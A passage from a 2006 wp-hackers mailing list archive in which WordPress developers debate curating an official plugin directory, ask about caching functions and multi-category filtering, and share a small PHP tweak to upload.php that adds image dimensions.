In-Reply-To: <000001c62cbb$5abdc310$6802a8c0@kergan>
References: <ebe43d680602080610g58468270u@mail.gmail.com>
	<000001c62cbb$5abdc310$6802a8c0@kergan>
Message-ID: <ebe43d680602080706q7dc45eb2t@mail.gmail.com>

On 08/02/06, Denis de Bernardy <denis@semiologic.com> wrote:
> Why not announce this on the wordpress blog directly?

Allow me to quote that exact email you cited:

> Or, we could put it on the
> devblog with a big disclaimer: 'do not actually install, for plugin
> authors only'.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From steagl at people.it  Wed Feb  8 15:05:41 2006
From: steagl at people.it (Stefano)
Date: Wed Feb  8 15:11:56 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com><43E930EF.3080605@mullenweg.com><43E94675.9020601@midnightcircus.com>
	<43E948DA.9030906@boren.nu><43E94C0A.8020109@midnightcircus.com><43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net><43E95820.7050803@boren.nu>
	<43E9A0EA.6080606@mullenweg.com><1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com> <07c401c62cc0$2b8865a0$6401a8c0@k9>
Message-ID: <t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>

Il Thu, 9 Feb 2006 01:58:49 +1100, "John Ha [c]"
<khanh@netspace.net.au> scrive:

>+1
>  ----- Original Message ----- 
>  From: Doug Stewart 

Please if you agree, could you avoid to quote a bunch of text just to
write +1 thank you

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From steagl at people.it  Wed Feb  8 15:10:04 2006
From: steagl at people.it (Stefano)
Date: Wed Feb  8 15:12:06 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com>
Message-ID: <072ku11bbg7cri08i4c37rvk7kajs0i143@4ax.com>

Il Wed, 08 Feb 2006 09:51:26 -0500, Doug Stewart
<dstewart@atl.lmco.com> scrive:

>Most plugins are the work of a single author, with little code control 
>or existing bug tracking interface.  The best way to keep plugins 
>working and up to date is to bug the authors, a task which is best left 
>to a decentralized infrastructure (i.e., let the people who use the 
>plugins annoy the plugin authors).

If you ask people devoted to assistance on forum they will tell you
that even if rhis should/would be the perfect way, zilion of reqyest
are for plugin not working, how to patch etc etc. We can arrange to
say: don't bug us ask the plugin developper... but i think it's a bad
way to give support, people want hi wp installation working with the
plugin they like, the righ and only thing we can answer is for
example: Don't use the tagXYZ plugin it's a poor plugin and no more
supported by auther, use tagQWERTY plugin that is "officially approved
by WP" and that updated to last wp realese. This willmake user having
an happy expirience.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From denis at semiologic.com  Wed Feb  8 15:11:47 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Wed Feb  8 15:13:22 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
In-Reply-To: <t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>
Message-ID: <000201c62cc1$fb822b00$6802a8c0@kergan>

> Please if you agree, could you avoid to quote a bunch of text 
> just to write +1 thank you

+1

Sorry. ;)

D.

From dstewart at atl.lmco.com  Wed Feb  8 15:11:53 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb  8 15:13:25 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43EA056E.4040002@atl.lmco.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk> <43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com>
Message-ID: <43EA0A39.6040407@atl.lmco.com>

Doug Stewart wrote:
> That seems like a particularly unhelpful analogy to be following here. 
> Linux distros ship a lot of software with each release and are 
> responsible for insuring that all that software works together. 
> WordPress' model is exactly the opposite: you get core functionality and 
> Hello Dolly, nothing else.  Unless you're proposing shipping a massive 
> .zip/.tar.gz with every bloody plugin known to the WP community, I fail 
> to see the comparison as a valid one.
> 
> Most plugins are the work of a single author, with little code control 
> or existing bug tracking interface.  The best way to keep plugins 
> working and up to date is to bug the authors, a task which is best left 
> to a decentralized infrastructure (i.e., let the people who use the 
> plugins annoy the plugin authors).
> 
> I think something along the lines of the old One-Click installs from 
> wp-plugins.net or the direction that Alchemy/Elixir were heading is a 
> much better idea, IMNSHO.
> 

Not to reply to myself here or anything, but perhaps what everyone would 
prefer is something along the lines of the Six Apart/Movable Type model, 
wherein a centralized official feed of recent plugins (and "Featured" 
plugins, as well) is available on their central server.  There's even a 
nice Atom feed showing the newest releases. Everyone else is pretty much 
operating off the ranch.

http://www.sixapart.com/pronet/plugins/

Just 'cause they're the "competition" doesn't mean we can't "steal" good 
ideas from 'em.  In fact, I'd say it's a great idea.  *grin*
-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From dstewart at atl.lmco.com  Wed Feb  8 15:17:31 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb  8 15:19:01 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <072ku11bbg7cri08i4c37rvk7kajs0i143@4ax.com>
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com>
	<072ku11bbg7cri08i4c37rvk7kajs0i143@4ax.com>
Message-ID: <43EA0B8B.3070608@atl.lmco.com>

Stefano wrote:
> If you ask people devoted to assistance on forum they will tell you
> that even if rhis should/would be the perfect way, zilion of reqyest
> are for plugin not working, how to patch etc etc. We can arrange to
> say: don't bug us ask the plugin developper... but i think it's a bad
> way to give support, people want hi wp installation working with the
> plugin they like, the righ and only thing we can answer is for
> example: Don't use the tagXYZ plugin it's a poor plugin and no more
> supported by auther, use tagQWERTY plugin that is "officially approved
> by WP" and that updated to last wp realese. This willmake user having
> an happy expirience.
> 

I would say, then, that the WP community is doing a very poor job at 
user expectations management.  Do I go whining to Microsoft when my 
Firefox session crashes? (No, I feebly shake my fist in the general 
direction of Redmond, sigh, mutter a vague curse concerning large 
meteorites and Bill Gates' general health and wellbeing, and then get 
back about my business.  But that's not important right now.)  I fail to 
see how the maintenance of WordPress plugins is the responsibility of 
the WP dev team/forum ops.

There are only so many man hours to go around and if we have high level 
devs tracking down incompatibilities in Joe Bag-o-Donuts' plugin setup, 
then we're going to drive ourselves crazy and stall further valuable WP 
development, to boot.


-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From khanh at netspace.net.au  Wed Feb  8 15:19:44 2006
From: khanh at netspace.net.au (John Ha)
Date: Wed Feb  8 15:21:19 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com><43E930EF.3080605@mullenweg.com><43E94675.9020601@midnightcircus.com><43E948DA.9030906@boren.nu><43E94C0A.8020109@midnightcircus.com><43E94F40.6060509@boren.nu><43E95249.9050903@skippy.net><43E95820.7050803@boren.nu><43E9A0EA.6080606@mullenweg.com><1139384828.5565.19.camel@localhost.localdomain><43EA056E.4040002@atl.lmco.com>
	<07c401c62cc0$2b8865a0$6401a8c0@k9>
	<t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>
Message-ID: <07fc01c62cc3$17758360$6401a8c0@k9>

Hope this is better - it was auto-marked by ciphire.
  ----- Original Message ----- 
  From: Stefano 
  To: wp-hackers@lists.automattic.com 
  Sent: Thursday, 9 February 2006 2:05 AM
  Subject: Re: [wp-hackers] Simplicity in 2.next


  Il Thu, 9 Feb 2006 01:58:49 +1100, "John Ha [c]"
  <khanh@netspace.net.au> scrive:

  >+1
  >  ----- Original Message ----- 
  >  From: Doug Stewart 

  Please if you agree, could you avoid to quote a bunch of text just to
  write +1 thank you

  -- 

  Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
  Email: steve@40annibuttati.it steagl@people.it
  Sites: http://www.40annibuttati.it (personal blog)
         http://www.wordpress-it.it (WordPress Italia)
  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 08 February 2006 at 15:19:45 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5AMUCAAB8AHwAAAABAAAAEQzqQ8UCAACOAg
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdETJ9ec1+r7GNgNe3eQTY0QE/lCdEQ27Uqk3YGvyP
7v+1U2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From khanh at netspace.net.au  Wed Feb  8 15:22:50 2006
From: khanh at netspace.net.au (John Ha)
Date: Wed Feb  8 15:24:23 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com><43E930EF.3080605@mullenweg.com><43E94675.9020601@midnightcircus.com><43E948DA.9030906@boren.nu><43E94C0A.8020109@midnightcircus.com><43E94F40.6060509@boren.nu><43E95249.9050903@skippy.net><43E95820.7050803@boren.nu><43E9A0EA.6080606@mullenweg.com><1139384828.5565.19.camel@localhost.localdomain><43EA056E.4040002@atl.lmco.com>
	<07c401c62cc0$2b8865a0$6401a8c0@k9>
	<t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>
Message-ID: <081301c62cc3$8657be60$6401a8c0@k9>

I left the quoted text in for context, but maybe you prefer me to write something instead of just a +? Is this better?

John
  ----- Original Message ----- 
  From: Stefano 
  To: wp-hackers@lists.automattic.com 
  Sent: Thursday, 9 February 2006 2:05 AM
  Subject: Re: [wp-hackers] Simplicity in 2.next


  Il Thu, 9 Feb 2006 01:58:49 +1100, "John Ha [c]"
  <khanh@netspace.net.au> scrive:

  >+1
  >  ----- Original Message ----- 
  >  From: Doug Stewart 

  Please if you agree, could you avoid to quote a bunch of text just to
  write +1 thank you

  -- 

  Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
  Email: steve@40annibuttati.it steagl@people.it
  Sites: http://www.40annibuttati.it (personal blog)
         http://www.wordpress-it.it (WordPress Italia)
  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 08 February 2006 at 15:22:51 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5AP0CAAB8AHwAAAABAAAAywzqQ/0CAACAAw
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdgr+U515iZbNlnQlNbV9ar5PdkkaroGPkS9JmFEcb
AO87U2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From davebytes at comcast.net  Wed Feb  8 15:24:38 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb  8 15:26:10 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <000001c62cb1$8d43c460$6802a8c0@kergan><43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
Message-ID: <00c101c62cc3$c70116a0$6e01a8c0@sixfour>

Actually, wp-hackers, as it is, already has way too many emails in a given 
day, too many threads at once...  I'd prefer the 'different mailing list' 
approach, maybe 'wp-hackers-announce' that is just 'push' announcements.  An 
announce list would be exclusively to detail either upcoming dates, major 
code changes (i.e., "All plugin authors: use new wp_blah facility"), etc.

+1 to that.

-d

----- Original Message ----- 
From: "David House" <dmhouse@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, February 08, 2006 9:10 AM
Subject: Re: [wp-hackers] Simplicity in 2.next


On 08/02/06, Ryan Duff <ryan@ryanduff.net> wrote:
> Advance notifications would be nice. Oh wait, I guess your logic is most
> plugin authors don't follow the hackers list, therefore, why make an
> announcement or have a public beta so they can fix things.

We could have a mailing list for plugin authors to subscribe to that
only posted preview release announcements. Or, we could put it on the
devblog with a big disclaimer: 'do not actually install, for plugin
authors only'.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From lists at viper007bond.com  Wed Feb  8 15:37:55 2006
From: lists at viper007bond.com (Viper007Bond)
Date: Wed Feb  8 15:39:27 2006
Subject: [wp-hackers] Documentation on the caching functions?
Message-ID: <43EA1053.3090807@viper007bond.com>

I'm using the SRG Clean Archives plugin ( 
http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug-in/ ) on 
my blog and it's starting to get up into the couple hundred queries area 
when I load the page I have it on.

So, I want to cache it. I know that get_settings() and all those use 
caching, but how can I cache directly without storing it in the database?

I see wp_cache_get() and wp_cache_set() in the source code, but what 
else is there and is there any documentation on them (simple is all I need)?

TIA. :)

- Viper007Bond
From VOGELAP at UCMAIL.UC.EDU  Wed Feb  8 15:56:38 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Wed Feb  8 15:57:50 2006
Subject: [wp-hackers] Documentation on the caching functions?
Message-ID: <E7340445E0595A418B2F8DE0AE480E20098A19FC@ucmail6.ad.uc.edu>

How did you get the "Post by Hour" graph at the top of that page? That's
cool. I'd like that on www.drewvogel.com.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Viper007Bond
> Sent: Wednesday, February 08, 2006 10:38 AM
> To: WordPress Hackers Mailing List
> Subject: [wp-hackers] Documentation on the caching functions?
> 
> I'm using the SRG Clean Archives plugin ( 
> http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug
-in/ ) on my blog and it's starting to get up into the couple > hundred
queries area when I load the page I have it on.
> 
> So, I want to cache it. I know that get_settings() and all 
> those use caching, but how can I cache directly without 
> storing it in the database?
> 
> I see wp_cache_get() and wp_cache_set() in the source code, 
> but what else is there and is there any documentation on them 
> (simple is all I need)?
> 
> TIA. :)
> 
> - Viper007Bond
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From steagl at people.it  Wed Feb  8 15:57:00 2006
From: steagl at people.it (Stefano)
Date: Wed Feb  8 15:58:46 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com>
	<072ku11bbg7cri08i4c37rvk7kajs0i143@4ax.com>
	<43EA0B8B.3070608@atl.lmco.com>
Message-ID: <di4ku19r96rpkk9co23kvl23ocpjuphlt1@4ax.com>

Il Wed, 08 Feb 2006 10:17:31 -0500, Doug Stewart
<dstewart@atl.lmco.com> scrive:

>I would say, then, that the WP community is doing a very poor job at 
>user expectations management.  Do I go whining to Microsoft when my 
...
>see how the maintenance of WordPress plugins is the responsibility of 
>the WP dev team/forum ops.

The idea was to have wp-plugins gardener that are not the core dev
people of WP.

>There are only so many man hours to go around and if we have high level 
>devs tracking down incompatibilities in Joe Bag-o-Donuts' plugin setup, 
>then we're going to drive ourselves crazy and stall further valuable WP 
>development, to boot.

Gardeners will take care for it, i suppose that we won't have 100%
plugins to touch at every release, statistic on downloads can show up
what plugin are most popular, and gardeners will ccare for a problem
to a plugin that score 1000 downloads/month more than to one tha score
15 downloads/month declassing last one to as not yet compatible. All
this won't set the request for help in the forum to 0 but they will
dcrease a lot. In a couple of cycle plugins developper that will take
care for theyr plugin will gain more and more audience and the other
will fall forget by wp community.

wp-plugins will care for the creme of the plugin production not for
the whole world of plugins, i prefere to have for example 2 gallery
plugin working flawlessy than a choise of 15 gallery plugins poor
manteined.

The idea iI expressed in other post are to have a sort of "quality
ribbon" for plugins that are good mantained by authors, if accindently
a plugin will miss support (authos can die, get hill, or doens't care
anymore) if i's popular will be keep up to date by gardeners, but the
basic idea is to have developpers take more care for theyr product
givin them visibility, a sort of "officiality" tools etc...

A showcase of 300 good plugins woth a lot mor than a list of 2000
plugins with just link to dev page.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From davebytes at comcast.net  Wed Feb  8 15:57:05 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb  8 15:58:49 2006
Subject: [wp-hackers] Documentation on the caching functions?
References: <43EA1053.3090807@viper007bond.com>
Message-ID: <00f201c62cc8$4edd38c0$6e01a8c0@sixfour>

You could set up WP-Cache, and have it ONLY cache that page (if you get 
tricky...).  That might be the easiest solution.

-d

----- Original Message ----- 
From: "Viper007Bond" <lists@viper007bond.com>
To: "WordPress Hackers Mailing List" <wp-hackers@lists.automattic.com>
Sent: Wednesday, February 08, 2006 10:37 AM
Subject: [wp-hackers] Documentation on the caching functions?


| I'm using the SRG Clean Archives plugin (
| http://www.sporadicnonsense.com/2005/04/28/clean-archives-plug-in/ ) on
| my blog and it's starting to get up into the couple hundred queries area
| when I load the page I have it on.
|
| So, I want to cache it. I know that get_settings() and all those use
| caching, but how can I cache directly without storing it in the database?
|
| I see wp_cache_get() and wp_cache_set() in the source code, but what
| else is there and is there any documentation on them (simple is all I 
need)?
|
| TIA. :)
|
| - Viper007Bond
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From davebytes at comcast.net  Wed Feb  8 16:04:43 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb  8 16:06:13 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <43E7AD17.6060907@mullenweg.com>
	<43E7BF44.1090605@boren.nu><43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu><43E7CAF6.9010303@tamba2.org.uk><5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com><43E7DADA.4090700@ebroder.net>
	<43E7E144.4090802@boren.nu><5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com><80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com><5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com><43E930EF.3080605@mullenweg.com><43E94675.9020601@midnightcircus.com>
	<43E948DA.9030906@boren.nu><43E94C0A.8020109@midnightcircus.com><43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net><43E95820.7050803@boren.nu>
	<43E9A0EA.6080606@mullenweg.com><1139384828.5565.19.camel@localhost.localdomain><43EA056E.4040002@atl.lmco.com>
	<43EA0A39.6040407@atl.lmco.com>
Message-ID: <00f801c62cc9$607c8620$6e01a8c0@sixfour>

>From what I've seen, they just provide a 'feed'.  Anyone in pronet can 
likely contribute an entry, doesn't look like code or zips are hosted on 6A. 
That's a great solution by me. ;)


Oh, and note every plugin page has the disclaimer:
"Disclaimer: Six Apart does not create or test these plugins and is not 
responsible for any adverse affects caused by their use."
(just fyi)

Also note some (many?  I dunno) of the top MT plugins require paid license 
(at least for commercial use...).

-d

----- Original Message ----- 
From: "Doug Stewart" <dstewart@atl.lmco.com>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, February 08, 2006 10:11 AM
Subject: Re: [wp-hackers] Simplicity in 2.next


| Not to reply to myself here or anything, but perhaps what everyone would
| prefer is something along the lines of the Six Apart/Movable Type model,
| wherein a centralized official feed of recent plugins (and "Featured"
| plugins, as well) is available on their central server.  There's even a
| nice Atom feed showing the newest releases. Everyone else is pretty much
| operating off the ranch.
|
| http://www.sixapart.com/pronet/plugins/
|
| Just 'cause they're the "competition" doesn't mean we can't "steal" good
| ideas from 'em.  In fact, I'd say it's a great idea.  *grin*

From dstewart at atl.lmco.com  Wed Feb  8 16:09:13 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb  8 16:10:42 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <00f801c62cc9$607c8620$6e01a8c0@sixfour>
References: <43E7AD17.6060907@mullenweg.com> <43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk> <43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com> <43EA0A39.6040407@atl.lmco.com>
	<00f801c62cc9$607c8620$6e01a8c0@sixfour>
Message-ID: <43EA17A9.9030707@atl.lmco.com>

David Chait wrote:
>>From what I've seen, they just provide a 'feed'.  Anyone in pronet can 
> likely contribute an entry, doesn't look like code or zips are hosted on 6A. 
> That's a great solution by me. ;)
> 
> 
> Oh, and note every plugin page has the disclaimer:
> "Disclaimer: Six Apart does not create or test these plugins and is not 
> responsible for any adverse affects caused by their use."
> (just fyi)
> 
> Also note some (many?  I dunno) of the top MT plugins require paid license 
> (at least for commercial use...).

Hey, there's nothing precluding that with WP either, as Dennis can 
attest to.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From nuclearmoose at gmail.com  Wed Feb  8 16:35:59 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb  8 16:37:30 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43EA17A9.9030707@atl.lmco.com>
References: <43E7AD17.6060907@mullenweg.com> <43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net> <43E95820.7050803@boren.nu>
	<43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com> <43EA0A39.6040407@atl.lmco.com>
	<00f801c62cc9$607c8620$6e01a8c0@sixfour>
	<43EA17A9.9030707@atl.lmco.com>
Message-ID: <5aa3aa0602080835kb933ad9y7ed81f306f86108@mail.gmail.com>

Am I the only one who sees a dog chasing its own tail in this thread?

Craig.
From dion at almaer.com  Wed Feb  8 16:36:59 2006
From: dion at almaer.com (Dion Almaer)
Date: Wed Feb  8 16:38:52 2006
Subject: [wp-hackers] Duo-categories: category_name=cat1_and_cat2
Message-ID: <09d001c62ccd$e1e050d0$6801a8c0@AUSTIN>


Hi guys,

I have a need to be able to filter the posts that get sent to the loop to be
posts that are marked in MULTIPLE categories.

As always, I like to use filters rather than hack at the core, but using:

add_filter('posts_where',...)
add_filter('posts_join',...)

Isn't going to really do the trick.

So, I looked at hacking the core to look at 'category_name' and if there is
a magic token (e.g. _and_) I can split it up and do a double join to make
sure that both categories.

Am I missing something obvious here? (I am not using the 'tag' plugins).

Cheers,

Dion Almaer
Founder, Ajaxian.com
http://ajaxian.com
Cleaning up the web with Ajax
From dion at almaer.com  Wed Feb  8 16:37:32 2006
From: dion at almaer.com (Dion Almaer)
Date: Wed Feb  8 16:39:31 2006
Subject: [wp-hackers] imgsize in upload.php
Message-ID: <09d101c62ccd$f56088a0$6801a8c0@AUSTIN>


Hi guys,

A small thing, but I always like my authors to put full height/width on
images that they upload, so I quickly hacked upload.php (in my blog platform
on WP 1.5, soon to be 2.0) to have:

---
if ( ereg('image/',$img1_type) ) {
        list($width, $height, $type, $attr) =
getimagesize(get_settings('fileupload_realpath') . '/' . $img1_name);

        $piece_of_code = '<img src="' . get_settings('fileupload_url') .'/'
. $img1_name . '" alt="' . $imgdesc . '" border="0" ' . $attr . '/>'; } else
{
        $piece_of_code = "<a href='". get_settings('fileupload_url') .
"/$img1_name' title='$imgdesc'>$imgdesc</a>"; }

$piece_of_code = htmlspecialchars( $piece_of_code );
---

In general I try hard not to change any of the core files and use plugins
and hooks to make all changes. This was one that I had to make to the core,
so thought if people would prefer it... Maybe we could have it in there? :)

Cheers,

Dion Almaer
Founder, Ajaxian.com
http://ajaxian.com
Cleaning up the web with Ajax
From stephen.yeargin at gmail.com  Wed Feb  8 16:49:07 2006
From: stephen.yeargin at gmail.com (Stephen Yeargin)
Date: Wed Feb  8 16:50:56 2006
Subject: [wp-hackers] Re: WP as CMS examples
Message-ID: <76b1d4b70602080849p4a8443f1le8e3d7487dae255f@mail.gmail.com>

http://sigep.utm.edu/ -- Fraternity Web site.
http://www.tfcd.org/ -- Political Web site.
http://www.utm.edu/organizations/utmdems/ (Using an old blogger
template for now)

I've got a few others that I'm converting over to WordPress from
static files. As a side topic, has anyone ever tried to use it for a
non-fsily newspaper Web site? The framework is great, but I run into
trouble when trying to group certain articles together by a particular
issue date.

--
Stephen Yeargin (stephen.yeargin@gmail.com)
From fuzzygroup at gmail.com  Wed Feb  8 16:36:03 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Wed Feb  8 17:14:26 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
In-Reply-To: <07fc01c62cc3$17758360$6401a8c0@k9>
References: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com> <07c401c62cc0$2b8865a0$6401a8c0@k9>
	<t42ku1pdbo865k72nb98ito8hge8hur5kn@4ax.com>
	<07fc01c62cc3$17758360$6401a8c0@k9>
Message-ID: <8e1656660602080836v4a299424x39b140734ab61575@mail.gmail.com>

*Chuckle*.  Um given that even Matt himself said plugin hosting on
wp-plugins.org was optional I wonder if this particular thread is long
